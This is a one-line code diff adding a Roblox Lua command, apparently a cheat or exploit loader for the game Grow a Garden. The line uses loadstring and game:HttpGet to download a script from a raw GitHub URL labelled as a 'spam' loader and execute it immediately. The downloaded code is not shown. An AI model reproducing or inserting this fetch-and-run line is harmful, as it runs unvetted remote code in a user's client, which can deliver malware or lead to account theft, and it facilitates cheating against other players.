@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/grow-a-garden-spam7-q53alhgbo957cy.lua"))()
